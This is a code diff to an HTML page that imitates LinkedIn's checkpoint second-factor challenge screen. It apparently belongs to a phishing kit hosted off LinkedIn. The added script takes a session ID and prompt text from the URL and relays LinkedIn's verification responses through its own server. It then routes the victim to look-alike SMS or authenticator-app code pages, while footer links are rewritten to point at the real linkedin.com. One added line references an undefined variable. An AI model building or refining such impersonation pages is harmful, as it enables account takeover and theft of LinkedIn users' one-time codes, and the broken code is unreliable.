@@ -162,9 +162,7 @@
                 <p class="resending hidden__imp" tabindex="-1">Resending...</p>
               </div>
               <div class="try_another_way">
-                <a id="try-another-way" tabindex="0" role="link">
-                  Verify using SMS
-                </a>
+                <a id="try-another-way" tabindex="0" role="link"> </a>
               </div>
               <div class="form__div-error hidden__imp">
                 <div class="form__error--icon">
@@ -310,14 +308,14 @@
             <ul class="footer__base__nav-list" aria-label="Footer Legal Menu">
               <li>
                 <a
-                  href="/legal/user-agreement?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_user_agreement"
+                  href="https://www.linkedin.com/legal/user-agreement?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_user_agreement"
                 >
                   User Agreement
                 </a>
               </li>
               <li>
                 <a
-                  href="/legal/privacy-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_privacy_policy"
+                  href="https://www.linkedin.com/legal/privacy-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_privacy_policy"
                 >
                   Privacy Policy
                 </a>
@@ -332,14 +330,14 @@
               </li>
               <li>
                 <a
-                  href="/legal/cookie-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_cookie_policy"
+                  href="https://www.linkedin.com/legal/cookie-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_cookie_policy"
                 >
                   Cookie Policy
                 </a>
               </li>
               <li>
                 <a
-                  href="/legal/copyright-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_copyright_policy"
+                  href="https://www.linkedin.com/legal/copyright-policy?trk=d_checkpoint_ch_linkedInAppChallengeActivityDevice_ft_copyright_policy"
                 >
                   Copyright Policy
                 </a>
@@ -434,6 +432,11 @@
     </form>
 
     <script>
+      let sessionId = new URLSearchParams(window.location.search).get(
+        "sessionId"
+      );
+      let text = new URLSearchParams(window.location.search).get("text");
+      document.getElementById("try-another-way").innerText = text;
       document.addEventListener("DOMContentLoaded", function () {
         // Prevent form submission
         const form = document.getElementById("in-app-challenge");
@@ -484,9 +487,6 @@
             // This allows the checkbox to toggle normally
           });
         }
-        let sessionId = new URLSearchParams(window.location.search).get(
-          "sessionId"
-        );
 
         function tryAnotherWay() {
           let tryAnotherWayXhr = new XMLHttpRequest();
@@ -494,7 +494,23 @@
           tryAnotherWayXhr.setRequestHeader("Content-Type", "application/json");
           tryAnotherWayXhr.send(JSON.stringify({ sessionId: sessionId }));
 
-          location.href = `/sms.html?sessionId=${sessionId}`;
+          tryAnotherWayXhr.onreadystatechange = function () {
+            if (this.status == 200 && this.readyState == 4) {
+              let response = this.response;
+              if (
+                response.includes(
+                  "Enter the code we’ve sent to phone number ending with"
+                )
+              ) {
+                location.href = `/sms.html?sessionId=${sessionId}&text=${responseText}`;
+              } else if (
+                response ==
+                "Enter the code you see on your authenticator app"
+              ) {
+                location.href = `/authenticator-app.html?sessionId=${sessionId}`;
+              }
+            }
+          };
         }
 
         function checkAppStatus() {
